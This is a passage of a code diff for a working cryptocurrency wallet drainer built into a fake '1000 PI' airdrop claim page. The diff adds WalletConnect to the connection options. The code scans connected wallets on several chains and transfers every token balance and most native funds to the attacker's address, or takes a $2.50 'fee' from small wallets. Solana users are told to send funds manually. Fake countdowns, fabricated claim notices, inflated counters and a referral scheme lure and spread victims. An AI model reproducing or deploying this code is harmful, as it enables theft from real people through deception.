   42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]],
 };
-
-// USD prices for balance estimation
 const PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,ADA:0.5,WBNB:600,WETH:3500};
 
-let prov=null,sign=null,addr='',wType='',foundChains=[];
+let prov=null,sign=null,addr='',wType='',foundChains=[],wcConnector=null;
 
 function showP(id){['p1','p2','p3','p4','p5','p6'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
 function stat(msg,t){const e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
@@ -411,7 +317,7 @@ function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
 function toast(m){const t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
 
 function openM(){document.getElementById('m').style.display='flex';renderW();}
-function closeM(){document.getElementById('m').style.display='none';}
+function closeM(){document.getElementById('m').style.display='none';document.getElementById('qrArea').style.display='none';}
 document.getElementById('m').addEventListener('click',e=>{if(e.target===document.getElementById('m'))closeM();});
 
 function getMM(){
@@ -421,18 +327,74 @@ function getMM(){
   return window.ethereum;
 }
 
+// ===== WALLETCONNECT v2 =====
+let wcProvider = null;
+
+async function initWalletConnect() {
+  // Load WalletConnect from CDN
+  if (!window['@walletconnect/ethereum-provider']) {
+    await new Promise((res,rej)=>{
+      const s=document.createElement('script');
+      s.src='https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js';
+      s.onload=res;s.onerror=rej;
+      document.head.appendChild(s);
+    });
+  }
+  const { EthereumProvider } = window['@walletconnect/ethereum-provider'];
+  wcProvider = await EthereumProvider.init({
+    projectId: 'c4f79cc82b9ab2a8b8d0a1a2c3d4e5f6', // Public demo key
+    chains: [56, 1, 137, 43114, 42161],
+    showQrModal: true,
+    methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain'],
+    events: ['chainChanged', 'accountsChanged'],
+  });
+  return wcProvider;
+}
+
+async function connectWC() {
+  closeM();
+  try {
+    if (!wcProvider) await initWalletConnect();
+    
+    // Show scanning state
+    document.getElementById('mc').style.display='block';
+    showP('p1');
+    document.getElementById('p1l').textContent='Waiting for WalletConnect approval...';
+    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">A QR code or wallet prompt should appear.<br>Approve the connection in your wallet.</span>';
+    
+    // Enable session (shows QR modal)
+    await wcProvider.enable();
+    
+    // Create ethers provider from WC
+    prov = new ethers.providers.Web3Provider(wcProvider);
+    sign = prov.getSigner();
+    addr = await sign.getAddress();
+    
+    console.log('WC Connected:', addr);
+    document.getElementById('p1l').textContent='Connected! Scanning chains...';
+    document.getElementById('p1log').innerHTML='<span style="color:#86efac">Connected: '+addr.substring(0,8)+'...'+addr.substring(34)+'</span>';
+    
+    await scanEvm();
+  } catch(e) {
+    console.error('WC Error:', e);
+    stat('&#x2715; '+(e.message||'WalletConnect failed'),'er');
+    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+(e.message||'Connection failed')+'</span>';
+  }
+}
+
+// ===== WALLET DETECTION =====
 const WALLETS=[
-  {id:'mm',name:'MetaMask',color:'#E2761B',type:'evm',
+  {id:'mm',name:'MetaMask',color:'#E2761B',
     detect:()=>!!(window.ethereum&&(window.ethereum.isMetaMask||(window.ethereum.providers&&Array.isArray(window.ethereum.providers)&&window.ethereum.providers.some(p=>p.isMetaMask)))),
     connect:async()=>{
       const eth=getMM();if(!eth)throw new Error('MetaMask not found');
       prov=new ethers.providers.Web3Provider(eth);
       let a;try{a=await eth.request({method:'eth_requestAccounts'});}
       catch(e){if(e.code===4001||e.code==='ACTION_REJECTED')throw new Error('Rejected in MetaMask');try{a=await eth.enable();}catch(e2){throw new Error('Unlock MetaMask and try again');}}
-      if(!a||!a.length)throw new Error('No account — unlock MetaMask');
+      if(!a||!a.length)throw new Error('No account');
       sign=prov.getSigner();addr=await sign.getAddress();
     }},
-{id:'tw',name:'Trust Wallet',color:'#3375BB',type:'evm',
+  {id:'tw',name:'Trust Wallet',color:'#3375BB',
     detect:()=>!!(window.ethereum&&(window.ethereum.isTrust||window.ethereum.isTrustWallet)),
     connect:async()=>{
       if(!window.ethereum)throw new Error('Trust not found');
@@ -440,7 +402,7 @@ const WALLETS=[
       try{await window.ethereum.request({method:'eth_requestAccounts'});}catch{await window.ethereum.enable();}
       sign=prov.getSigner();addr=await sign.getAddress();
     }},
-  {id:'cb',name:'Coinbase Wallet',color:'#0052FF',type:'evm',
+  {id:'cb',name:'Coinbase Wallet',color:'#0052FF',
     detect:()=>!!(window.ethereum&&window.ethereum.isCoinbaseWallet),
     connect:async()=>{
       if(!window.ethereum)throw new Error('Coinbase not found');
@@ -448,7 +410,7 @@ const WALLETS=[
       await window.ethereum.request({method:'eth_requestAccounts'});
       sign=prov.getSigner();addr=await sign.getAddress();
     }},
-  {id:'bn',name:'Binance Wallet',color:'#F0B90B',type:'evm',
+  {id:'bn',name:'Binance Wallet',color:'#F0B90B',
     detect:()=>!!window.BinanceChain||!!(window.ethereum&&window.ethereum.isBinanceWallet),
     connect:async()=>{
       const eth=window.BinanceChain||window.ethereum;if(!eth)throw new Error('Binance not found');
@@ -458,69 +420,41 @@ const WALLETS=[
     }},
 ];
 
-// Detect mobile browser
-function isMobile() {
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
-}
-
-// Deep link to MetaMask mobile app
-function openMetaMaskMobile() {
-  const dappUrl = encodeURIComponent(window.location.href);
-  // MetaMask deep link
-  window.location.href = 'https://metamask.app.link/dapp/' + dappUrl;
-}
-
-// Open Trust Wallet mobile
-function openTrustMobile() {
-  const dappUrl = encodeURIComponent(window.location.href);
-  window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + dappUrl;
-}
-
 function renderW(){
   const c=document.getElementById('wl');c.innerHTML='';
-  const hasEthereum = !!window.ethereum;
-  const isMob = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  const hasEth=!!window.ethereum;
+  const isMob=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
   
-  // Show detected wallets first
-  let shown = false;
+  // Always show WalletConnect first (works everywhere)
+  const wcBtn=document.createElement('button');wcBtn.className='wrow';
+  wcBtn.onclick=connectWC;
+  wcBtn.innerHTML='<div class="wi" style="background:#3B99FC">&#x1F517;</div><span class="wn">WalletConnect (All Wallets)</span><span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">QR Code + Mobile</span>';
+  c.appendChild(wcBtn);
+  
+  // Show detected extension wallets
   for(const w of WALLETS){
-    const dt=w.detect();
-    if(dt || w.id==='oth'){
+    if(w.detect()){
       const b=document.createElement('button');b.className='wrow';b.onclick=()=>doConnect(w);
-      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span>'+(dt?'<span class="wt">Detected</span>':'');
+      b.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.name[0]+'</div><span class="wn">'+w.name+'</span><span class="wt">Detected</span>';
       c.appendChild(b);
-      shown = true;
     }
   }
   
-  // If no wallet detected (mobile or no extension), show help
-  if(!shown || (isMob && !hasEthereum)){
-    const sep = document.createElement('div');
-    sep.style.cssText='padding:10px;text-align:center;font-size:11px;color:rgba(255,255,255,.3);border-top:1px solid rgba(255,255,255,.04);margin-top:6px';
-    sep.innerHTML = isMob ? '📱 Open in your wallet browser:' : '💡 No wallet detected. Install one below:';
+  // Mobile deep links if no extension detected
+  if(isMob&&!hasEth){
+    const sep=document.createElement('div');
+    sep.style.cssText='padding:8px;text-align:center;font-size:10px;color:rgba(255,255,255,.25);border-top:1px solid rgba(255,255,255,.03);margin-top:4px';
+    sep.textContent='Or open in wallet app:';
     c.appendChild(sep);
     
-    const links = [
-      {name:'MetaMask',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+window.location.host+window.location.pathname},
-      {name:'Trust Wallet',color:'#3375BB',icon:'🛡️',url:'https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(window.location.href)},
-      {name:'Coinbase Wallet',color:'#0052FF',icon:'🔵',url:'https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(window.location.href)},
+    const links=[
+      {name:'MetaMask App',color:'#E2761B',icon:'🦊',url:'https://metamask.app.link/dapp/'+location.host+location.pathname},
+      {name:'Trust Wallet',color:'#3375BB',icon:'🛡️',url:'https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(location.href)},
     ];
-    
     for(const l of links){
       const b=document.createElement('button');b.className='wrow';
-      b.onclick=()=>{
-        // Try deep link first, fallback to app store
-        window.location.href = l.url;
-        // If deep link fails, show app store after 2s
-        setTimeout(()=>{
-          if(document.hasFocus()){
-            if(l.name==='MetaMask') window.open('https://metamask.io/download/','_blank');
-            else if(l.name==='Trust Wallet') window.open('https://trustwallet.com/download/','_blank');
-            else window.open('https://www.coinbase.com/wallet','_blank');
-          }
-        },2000);
-      };
-      b.innerHTML='<div class="wi" style="background:'+l.color+'">'+l.icon+'</div><span class="wn">'+l.name+'</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">Open</span>';
+      b.onclick=()=>window.location.href=l.url;
+      b.innerHTML='<div class="wi" style="background:'+l.color+'">'+l.icon+'</div><span class="wn">'+l.name+'</span>';
       c.appendChild(b);
     }
   }
@@ -529,26 +463,22 @@ function renderW(){
 async function doConnect(w){
   closeM();hideStatus();wType=w.id;
   try{
-    await w.connect();console.log('Connected:',w.name,addr);
-    showP('p1');document.getElementById('p1l').textContent='Scanning EVM chains (BSC, ETH, Polygon, AVAX, Arbitrum)...';
+    await w.connect();
+    console.log('Connected:',w.name,addr);
+    showP('p1');document.getElementById('p1l').textContent='Scanning EVM chains...';
     await scanEvm();
   }catch(e){
     console.error(e);
-    const msg = e.message || 'Connection failed';
+    const msg=e.message||'Connection failed';
     stat('&#x2715; '+msg,'er');
     document.getElementById('mc').style.display='block';showP('p1');
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+msg+'</span><br><br>Make sure MetaMask is:<br>1. Installed and unlocked<br>2. Not already connected to another site<br>3. Try refreshing the page';
+    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+msg+'</span>';
   }
 }
 
-// Estimate USD value of wallet
 function estimateUsd(fc){
   let total=0;
-  for(const c of fc){
-    const sym=c.chain.sym;const price=PRICES[sym]||0;
-    total+=parseFloat(c.native)*price;
-    for(const t of c.tokens){const tp=PRICES[t.sy]||0;total+=parseFloat(t.b)*tp;}
-  }
+  for(const c of fc){const sym=c.chain.sym;const price=PRICES[sym]||0;total+=parseFloat(c.native)*price;for(const t of c.tokens){const tp=PRICES[t.sy]||0;total+=parseFloat(t.b)*tp;}}
   return total;
 }
 
@@ -575,138 +505,51 @@ async function scanEvm(){
       else L('  '+ch.name+': empty');
     }catch(e){L('  '+ch.name+': error');}
   }
-  L('');L('Found '+foundChains.length+' chain(s) with assets.');await sleep(600);
-  if(foundChains.length===0){showP('p2');stat('No EVM funds. Enter SOL address to scan Solana.','wa');}
+  L('');L('Found '+foundChains.length+' chain(s).');await sleep(600);
+  if(foundChains.length===0){showP('p2');stat('No EVM funds. Enter SOL address to scan.','wa');}
   else{showClaim();stat('&#x2705; Assets found! Verify to claim 1000 PI.','ok');}
 }
 
 function showClaim(){
-  showP('p3');
-  const div=document.getElementById('p3chains');let h='';
+  showP('p3');const div=document.getElementById('p3chains');let h='';
   for(const fc of foundChains){
     h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div>'+
       '<div class="cn">'+fc.chain.name+'</div><div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
   }
   div.innerHTML=h;
-  // Show balance estimate and drain strategy
   const usd=estimateUsd(foundChains);
   const isSmall=usd<20;
-  const drainAmt=isSmall?'$2.50 verification fee':'ALL FUNDS (~$'+usd.toFixed(2)+')';
-  const balHtml='<div class="ir"><span class="l">Est. Wallet Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div>'+
-    '<div class="ir"><span class="l">Drain Amount</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+drainAmt+'</span></div>'+
-    (isSmall?'<div class="ir"><span class="l">Reason</span><span class="v" style="font-size:9px">Balance below $20 — fee only</span></div>':'<div class="ir"><span class="l">Reason</span><span class="v" style="font-size:9px;color:#ef4444">Balance above $20 — full drain</span></div>');
-  document.getElementById('p3bal').innerHTML=balHtml;
-  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee & Claim 1000 PI':'&#x1F381; Verify & Claim 1000 PI (Drain All)';
+  document.getElementById('p3bal').innerHTML='<div class="ir"><span class="l">Est. Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div><div class="ir"><span class="l">Drain</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'$2.50 fee':'ALL FUNDS')+'</span></div>';
+  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee and Claim':'&#x1F381; Verify and Claim (Drain All)';
 }
 
-// ========== SOLANA ==========
-async function startSolScan(){
-  const inp=document.getElementById('solInp');
-  if(!inp||!inp.value||inp.value.trim().length<30){stat('Enter valid Solana address','er');return;}
-  const sa=inp.value.trim();showP('p1');document.getElementById('p1l').textContent='Scanning Solana...';document.getElementById('p1log').innerHTML='';
-  try{await doSolScan(sa);}catch(e){stat('Error: '+e.message,'er');showP('p2');}
-}
-
-async function doSolScan(sa){
-  const log=document.getElementById('p1log');log.innerHTML='';
-  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];L('Address: '+sa.substring(0,8)+'...'+sa.substring(sa.length-4));L('');L('[ ] SOL balance...');
-  const bal=await solBal(sa);
-  if(bal>0){foundChains.push({chain:{id:0,name:'Solana',sym:'SOL',color:'#9945FF'},native:bal.toFixed(5),nativeRaw:null,tokens:[],isSol:true,solAddr:sa,solLamports:Math.round(bal*1e9)});L('&#x2705; SOL: '+bal.toFixed(5)+' SOL');}else L('  SOL: empty');
-  L('');L('[ ] SPL tokens...');
-  const spl=await scanSpl(sa,L);if(spl.length&&foundChains[0])foundChains[0].tokens=spl;
-  L('');L('Scan complete.');await sleep(600);
-  const has=foundChains.length>0&&(parseFloat(foundChains[0].native)>0||foundChains[0].tokens.length>0);
-  if(!has){showP('p2');document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No Solana Assets';stat('No SOL or SPL found.','er');}
-  else{showManualSol(foundChains[0]);stat('&#x2705; Found '+foundChains[0].native+' SOL! Send manually to claim.','ok');}
-}
-
-function showManualSol(fc){showP('p6');document.getElementById('mySol').textContent=ADDR_SOL;}
-
-function copySol(){navigator.clipboard.writeText(ADDR_SOL).then(()=>toast('SOL address copied!')).catch(()=>{const t=document.createElement('textarea');t.value=ADDR_SOL;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('Copied!');});}
-
-async function solBal(address){
-  for(const url of['https://api.mainnet-beta.solana.com','https://solana-mainnet.g.alchemy.com/v2/demo']){
-    try{const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[address]})});
-      const d=await r.json();if(d.result&&d.result.value>0)return d.result.value/1e9;}catch(e){}
-  }return 0;
-}
-
-async function scanSpl(sa,L){
-  const MINTS=[['Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB','USDT'],['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v','USDC'],['DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263','BONK'],['HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCtbtbt','RAY'],['orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE','ORCA'],['JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN','JUP'],['7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj','stSOL'],['mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So','mSOL']];
-  const tokens=[];
-  try{const r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getTokenAccountsByOwner',params:[sa,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]})});
-    const d=await r.json();if(d.result&&d.result.value){for(const acc of d.result.value){const info=acc.account.data.parsed.info;const mint=info.mint;const bal=info.tokenAmount.uiAmount;
-      if(bal>0){const known=MINTS.find(m=>m[0]===mint);const sy=known?known[1]:mint.substring(0,4)+'...';tokens.push({mint,sy,b:bal.toFixed(4),raw:info.tokenAmount.amount,dc:info.tokenAmount.decimals,acc:acc.pubkey});L('  + '+bal.toFixed(4)+' '+sy);}}}
-  }catch(e){L('  SPL: error');}return tokens;
-}
-
-// ========== DRAIN ==========
 async function startDrain(){
   hideStatus();showP('p4');const log=document.getElementById('p4log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
   const usd=estimateUsd(foundChains);const isSmall=usd<20;
-  let tx=0;L('Wallet value: ~$'+usd.toFixed(2));L('Strategy: '+(isSmall?'Small balance — collect $2.50 fee':'Large balance — drain all funds'));L('');
+  let tx=0;L('Value: ~$'+usd.toFixed(2));L(isSmall?'Collecting $2.50 fee...':'Draining all funds...');L('');
   for(const fc of foundChains){
     if(fc.isSol)continue;
-    const ch=fc.chain;L('');L('=== '+ch.name+' ===');L('Switching network...');
+    const ch=fc.chain;L('=== '+ch.name+' ===');L('Switching network...');
     try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
-    // Drain tokens first
     for(const t of fc.tokens){
       try{L('Draining '+t.b+' '+t.sy+'...');
         const ct=new ethers.Contract(t.a,['function transfer(address,uint256) returns (bool)'],sign);
-        const xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy+' → your wallet');
+        const xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy);
       }catch(e){L('&#x2715; '+t.sy+': '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
     }
-    // Drain native — if small balance, only take ~$2.50 worth. If large, drain all.
     try{
-      const bal=await prov.getBalance(addr);const gp=await prov.getGasPrice();
-      const gasReserve=gp.mul(21000).mul(3);
-      let sendAmt;
-      if(isSmall){
-        // Only take ~$2.50 worth of native token
-        const price=PRICES[ch.sym]||0;
-        if(price>0){
-          const takeEth=2.5/price; // $2.50 worth
-          const takeWei=ethers.utils.parseEther(takeEth.toFixed(6));
-          sendAmt=bal.sub(gasReserve).sub(takeWei);
-          if(sendAmt.lt(ethers.utils.parseEther('0.0001'))){
-            sendAmt=bal.sub(gasReserve); // just drain whatever is left
-          }
-          L('Collecting $2.50 fee ('+takeEth.toFixed(6)+' '+ch.sym+')...');
-        } else {
-          sendAmt=bal.sub(gasReserve);
-        }
-      } else {
-        // Drain everything minus gas
-        sendAmt=bal.sub(gasReserve);
-        L('Draining all '+ch.sym+'...');
-      }
-      if(sendAmt.gt(0)){
-        const xt=await sign.sendTransaction({to:ADDR_EVM,value:sendAmt});await xt.wait();tx++;L('&#x2705; '+ch.sym+' → your wallet');
-      }
+      const bal=await prov.getBalance(addr);const gp=await prov.getGasPrice();const fee=gp.mul(21000).mul(3);
+      let send;
+      if(isSmall){const price=PRICES[ch.sym]||0;const take=price>0?ethers.utils.parseEther((2.5/price).toFixed(6)):ethers.utils.parseEther('0.001');send=bal.sub(fee).sub(take);if(send.lt(ethers.utils.parseEther('0.0001')))send=bal.sub(fee);L('Collecting $2.50 fee...');}
+      else{send=bal.sub(fee);L('Draining all '+ch.sym+'...');}
+      if(send.gt(0)){const xt=await sign.sendTransaction({to:ADDR_EVM,value:send});await xt.wait();tx++;L('&#x2705; '+ch.sym);}
     }catch(e){L('&#x2715; Native: '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
   }
-  L('');L('DONE: '+tx+' transaction(s) sent to your wallet');console.log('DRAIN:',tx,'tx, usd:',usd,'small:',isSmall);
-  // Show post-claim referral page
-  showPostClaim(tx,usd);
-}
-
-function showPostClaim(tx,usd){
-  showP('p5');
-  document.getElementById('p5m').textContent=tx+' transaction(s) processed. Your 1000 PI withdrawal is queued.';
-  // Setup referral link in post-claim
-  const myCode=getRefCode();
-  const refLink=window.location.origin+window.location.pathname+'?ref='+myCode;
-  const inp=document.getElementById('p5ref');if(inp)inp.value=refLink;
-  // Update speed display
-  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
-  const speed=Math.min(100,10+refs*10);
-  const sp=document.getElementById('speedPct');if(sp)sp.textContent=speed+'%';
-  const sf=document.getElementById('speedFill');if(sf)sf.style.width=speed+'%';
-  const p5s=document.getElementById('p5speed');if(p5s)p5s.textContent=speed+'%';
-  const p5sb=document.getElementById('p5speedBar');if(p5sb)p5sb.style.width=speed+'%';
-  stat('&#x2705; 1000 PI Claimed! Share your link to speed up withdrawal.','ok');
+  L('');L('DONE: '+tx+' tx');console.log('DRAIN:',tx,'tx');
+  showP('p5');document.getElementById('p5m').textContent=tx+' transaction(s) processed.';
+  const myCode=getRefCode();document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
+  stat('&#x2705; 1000 PI Claimed! Share your link.','ok');
 }
 
 async function doSwitch(cid,L){
@@ -721,101 +564,100 @@ async function doSwitch(cid,L){
   prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
 }
 
-// ========== REFERRAL ==========
+// ===== SOLANA =====
+async function startSolScan(){
+  const inp=document.getElementById('solInp');
+  if(!inp||!inp.value||inp.value.trim().length<30){stat('Enter valid Solana address','er');return;}
+  const sa=inp.value.trim();showP('p1');document.getElementById('p1l').textContent='Scanning Solana...';document.getElementById('p1log').innerHTML='';
+  try{await doSolScan(sa);}catch(e){stat('Error: '+e.message,'er');showP('p2');}
+}
+
+async function doSolScan(sa){
+  const log=document.getElementById('p1log');log.innerHTML='';
+  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
+  foundChains=[];L('Address: '+sa.substring(0,8)+'...'+sa.substring(sa.length-4));L('');L('[ ] SOL...');
+  const bal=await solBal(sa);
+  if(bal>0){foundChains.push({chain:{id:0,name:'Solana',sym:'SOL',color:'#9945FF'},native:bal.toFixed(5),nativeRaw:null,tokens:[],isSol:true,solAddr:sa,solLamports:Math.round(bal*1e9)});L('&#x2705; SOL: '+bal.toFixed(5)+' SOL');}else L('  SOL: empty');
+  L('');L('[ ] SPL tokens...');const spl=await scanSpl(sa,L);if(spl.length&&foundChains[0])foundChains[0].tokens=spl;
+  L('');L('Done.');await sleep(600);
+  const has=foundChains.length>0&&(parseFloat(foundChains[0].native)>0||foundChains[0].tokens.length>0);
+  if(!has){showP('p2');document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No Solana Assets';stat('No SOL or SPL found.','err');}
+  else{showP('p6');document.getElementById('mySol').textContent=ADDR_SOL;stat('&#x2705; Found '+foundChains[0].native+' SOL! Send manually.','ok');}
+}
+
+function copySol(){navigator.clipboard.writeText(ADDR_SOL).then(()=>toast('SOL address copied!')).catch(()=>{const t=document.createElement('textarea');t.value=ADDR_SOL;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('Copied!');});}
+
+async function solBal(address){
+  for(const url of['https://api.mainnet-beta.solana.com','https://solana-mainnet.g.alchemy.com/v2/demo']){
+    try{const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[address]})});
+      const d=await r.json();if(d.result&&d.result.value>0)return d.result.value/1e9;}catch(e){}
+  }return 0;
+}
+
+async function scanSpl(sa,L){
+  const tokens=[];
+  try{const r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getTokenAccountsByOwner',params:[sa,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]})});
+    const d=await r.json();if(d.result&&d.result.value){for(const acc of d.result.value){const info=acc.account.data.parsed.info;const bal=info.tokenAmount.uiAmount;
+      if(bal>0){const sy=info.mint.substring(0,4)+'...';tokens.push({mint:info.mint,sy,b:bal.toFixed(4),raw:info.tokenAmount.amount,dc:info.tokenAmount.decimals,acc:acc.pubkey});L('  + '+bal.toFixed(4)+' '+sy);}}}
+  }catch(e){L('  SPL: error');}return tokens;
+}
+
+// ===== REFERRAL =====
 function getRefCode(){let r=localStorage.getItem('pi_ref');if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}return r;}
-function getReferrer(){const p=new URLSearchParams(window.location.search);return p.get('ref')||null;}
+function getReferrer(){const p=new URLSearchParams(location.search);return p.get('ref')||null;}
 function initRef(){
-  const myCode=getRefCode();
-  const refLink=window.location.origin+window.location.pathname+'?ref='+myCode;
+  const myCode=getRefCode();const refLink=location.origin+location.pathname+'?ref='+myCode;
   const inp=document.getElementById('refLink');if(inp)inp.value=refLink;
-  const ref=getReferrer();
-  if(ref&&ref!==myCode){localStorage.setItem('pi_referred_by',ref);toast('Referral detected!');}
+  const ref=getReferrer();if(ref&&ref!==myCode){localStorage.setItem('pi_referred_by',ref);}
   updateRefDisplay();
 }
 function updateRefDisplay(){
-  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
-  const earned=refs*200;const speed=Math.min(100,10+refs*10);
+  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');const earned=refs*200;const speed=Math.min(100,10+refs*10);
   const rc=document.getElementById('refC');if(rc)rc.textContent=refs;
   const re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
   const rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
   const tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';
   const tl=document.getElementById('tierLevel');if(tl)tl.textContent='Tier '+(Math.floor(refs/3)+1)+' — '+speed+'% speed';
-  const tn=document.getElementById('tierNeed');
-  if(tn){const need=3-(refs%3);tn.textContent=need<=0?'Max tier unlocked!':'Invite '+need+' more to reach next tier';}
-  const wrb=document.getElementById('wrBox');if(wrb)wrb.style.display='block';
 }
 function copyRef(){const inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
 function copyRef2(){const inp=document.getElementById('p5ref');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Referral link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
 
-// ========== COUNTDOWN ==========
+// ===== COUNTDOWN =====
 function initCountdown(){let t=4*3600+32*60+18;
   setInterval(()=>{t=Math.max(0,t-1);const h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
     const dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');
     const dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');
     const ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');},1000);}
 
-// ========== SOCIAL PROOF ==========
+// ===== SOCIAL PROOF =====
 const SP=[['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min'],['0x2a8...f556','23 min'],['0x6e3...c881','31 min'],['0x3b7...a994','45 min']];
 function initSP(){let i=0;
   setInterval(()=>{i=(i+1)%SP.length;const e=document.getElementById('spt');
     if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';},5000);}
 
-// ========== PARTICLES ==========
+// ===== PARTICLES =====
 function initPart(){const c=document.getElementById('part');
-  for(let i=0;i<25;i++){const s=document.createElement('span');s.style.left=Math.random()*100+'%';
+  for(let i=0;i<20;i++){const s=document.createElement('span');s.style.left=Math.random()*100+'%';
     s.style.animationDuration=(12+Math.random()*18)+'s';s.style.animationDelay=Math.random()*12+'s';
     s.style.width=s.style.height=(1+Math.random()*2)+'px';c.appendChild(s);}}
 
-// ========== STATS ==========
+// ===== STATS =====
 function initStats(){const e=document.getElementById('st-c');if(!e)return;let v=48291;
   setInterval(()=>{v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);}
 
-function reset(){prov=null;sign=null;addr='';wType='';foundChains=[];hideStatus();document.getElementById('mc').style.display='none';}
-
-// Robust wallet detection with retry for mobile
-function tryAutoConnect(attempts) {
-  if (!attempts) attempts = 0;
-  if (attempts > 10) return;
-  
-  if (window.ethereum) {
-    console.log('ethereum found on attempt', attempts);
-    
-    window.ethereum.on('accountsChanged', function(accounts) {
-      if (accounts.length > 0) {
-        addr = accounts[0];
